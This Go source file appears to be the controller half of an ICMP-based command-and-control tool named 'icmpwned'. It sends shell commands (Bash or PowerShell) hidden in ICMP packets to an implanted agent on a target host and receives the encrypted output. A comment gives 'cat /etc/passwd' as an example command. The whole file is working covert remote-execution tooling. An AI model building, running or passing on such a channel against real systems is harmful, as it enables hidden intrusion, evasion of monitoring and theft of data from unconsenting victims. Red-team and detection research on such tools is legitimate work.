package main

import (
	"errors"
	"net"
	"os"
	"strconv"
	"time"

	"github.com/s-christian/icmpwned/lib/logger"
	"github.com/s-christian/icmpwned/lib/system"
	"github.com/s-christian/icmpwned/lib/utils"
	"golang.org/x/net/ipv4"
)

var (
	target  string // example - 192.168.149.129
	command string // example - Linux: cat /etc/passwd; Windows: Get-ChildItem C:/Users
)

func main() {
	if len(os.Args) != 3 {
		logger.Log(logger.Error, "usage:", os.Args[0], "<target> <command>")
		os.Exit(logger.ERR_USAGE)
	}

	target = os.Args[1]  // agent to send command to
	command = os.Args[2] // command string to execute in target's shell (Linux: Bash, Windows: PowerShell)

	// Resolve any DNS (if used) to get the real IP of the target
	// Also checks that the provided IP is valid
	targetIP, err := net.ResolveIPAddr("ip4", target)
	if err != nil {
		logger.LogError(err)
		os.Exit(logger.ERR_CONNECTION)
	}

	// Create ICMP connection to send packet over
	conn, err := utils.ListenICMP(system.GetHostIP().String())
	if err != nil {
		logger.Log(logger.Error, "Could not start raw ICMP listener")
		logger.LogError(err)
		os.Exit(logger.ERR_CONNECTION)
	}

	logger.Log(logger.Info, "Sending command to", targetIP.String())

	// Send command to target
	startTime, err := utils.SendICMPData(conn, targetIP, []byte(command))
	if err != nil {
		logger.LogError(err)
		os.Exit(logger.ERR_CONNECTION)
	}

	// Receive Echo Reply from Agent to confirm receipt of command
	err = utils.ICMPDataReceived(conn, targetIP.IP, []byte(command))
	if err != nil {
		logger.LogError(err)
		os.Exit(logger.ERR_GENERIC)
	}
	logger.Log(logger.Done, "Agent confirmed receipt of command")

	// Wait for data to be returned from command
	for {
		err = conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		if err != nil {
			logger.LogError(err)
			os.Exit(logger.ERR_CONNECTION)
		}

		rawReply, icmpType, srcAddr, err := utils.GetICMPData(conn)
		if err != nil {
			logger.Log(logger.Error, "Could not get data from agent")
			logger.LogError(err)

			var WrongReplyIPError *utils.WrongReplyIPError
			if errors.As(err, &WrongReplyIPError) || errors.Is(err, utils.ErrNoMagic) {
				continue
			}

			os.Exit(logger.ERR_CONNECTION)
		}

		// Don't process unexpected ICMP Echo Replies
		// To fix a Windows issue, don't capture replies that originate from your own system.
		if icmpType == ipv4.ICMPTypeEchoReply { //&& srcAddr.String() != listenAddress.String() {
			logger.Log(logger.Debug, "Caught unexpected Echo Reply from", srcAddr.String())
			continue
		}

		err = utils.ValidateICMPPacket(srcAddr, targetIP.IP)
		if err != nil {
			logger.LogError(err)
			continue
		}

		decryptedReply, err := utils.DecryptContent(rawReply)
		if err != nil {
			logger.LogError(err)
			continue
		}
		decryptedReplyString := string(decryptedReply)

		duration := time.Since(startTime)
		logger.Log(logger.Done, "Output from", srcAddr.String(), "("+strconv.Itoa(len(rawReply)), "bytes in", duration.String()+"):"+"\n"+decryptedReplyString)

		break
	}

	_ = conn.Close()
}
